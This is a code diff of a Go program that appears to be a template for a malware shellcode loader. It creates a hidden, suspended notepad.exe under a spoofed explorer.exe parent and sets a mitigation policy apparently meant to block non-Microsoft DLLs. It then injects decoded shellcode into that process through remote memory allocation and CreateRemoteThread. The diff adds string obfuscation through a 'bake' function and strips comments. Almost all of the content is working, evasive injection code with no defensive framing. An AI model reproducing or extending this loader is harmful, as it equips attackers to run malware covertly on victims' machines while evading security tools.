@@ -91,22 +91,22 @@ func processes() ([]windowsProcess, error) {
 }
 
 func writeShellcode(pid int, sc []byte) (uintptr, uintptr, int) {
-	var F int = 0
-	proc, _, _ := openProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(pid))
-	raddr, _, _ := virtualAllocEx.Call(proc, uintptr(F), uintptr(len(sc)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	writeProcessMemory.Call(proc, raddr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(F))
-	return proc, raddr, F
+	var f int = 0
+	proc, _, _ := openProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(f), uintptr(pid))
+	raddr, _, _ := virtualAllocEx.Call(proc, uintptr(f), uintptr(len(sc)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	writeProcessMemory.Call(proc, raddr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(f))
+	return proc, raddr, f
 }
 
 func createRemoteThreadAndWait(proc uintptr, raddr uintptr, f int) error {
 	crts, _, _ := createRemoteThread.Call(proc, uintptr(f), 0, raddr, uintptr(f), 0, uintptr(f))
 	if crts == 0 {
-		err := errors.New(bake("§[-] CreateRemoteThread Failed§")) // [-] Create Remote Thread Failed
+		err := errors.New(bake("§[-] CreateRemoteThread Failed§"))
 		return err
 	}
 	_, _, errWaitForSingleObject := waitForSingleObject.Call(proc, 0, syscall.INFINITE)
 	if errWaitForSingleObject.Error() != bake("§The operation completed successfully.§") {
-		return errors.New(bake("§[-] WaitForSingleObject Failed§")) // [!] ERROR: WaitForSingleObject Failed\r\n
+		return errors.New(bake("§[-] WaitForSingleObject Failed§"))
 	}
 	return nil
 }
@@ -114,7 +114,6 @@ func createRemoteThreadAndWait(proc uintptr, raddr uintptr, f int) error {
 func main() {
 	var encoded = "§shellcode§"
 	var sc = polish(encoded)
-
 	procThreadAttributeSize := uintptr(0)
 	syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
 	procHeap, err := syscalls.GetProcessHeap()
@@ -126,15 +125,14 @@ func main() {
 	mitigate := 0x20007
 	nonms := uintptr(0x100000000000)
 	syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
-
 	procs, err := processes()
 	if err != nil {
 		log.Fatal(err)
 	}
-	parentName := "§explorer.exe§"
-	ParentInfo := findProcessByName(procs, parentName)
-	if ParentInfo != nil {
-		ppid := uint32(ParentInfo.ProcessID)
+	parentName := bake("§explorer.exe§")
+	parentInfo := findProcessByName(procs, parentName)
+	if parentInfo != nil {
+		ppid := uint32(parentInfo.ProcessID)
 		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
 		uintParentHandle := uintptr(parentHandle)
 		syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil)
@@ -143,10 +141,9 @@ func main() {
 		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
 		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
 		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
-		programPath := "§c:\\windows\\system32\\notepad.exe§"
+		programPath := bake("§c:\\windows\\system32\\notepad.exe§")
 		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
 		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
-
 		targetPid := int(procInfo.ProcessId)
 		var proc, raddr, f = writeShellcode(targetPid, sc)
 		createRemoteThreadAndWait(proc, raddr, f)
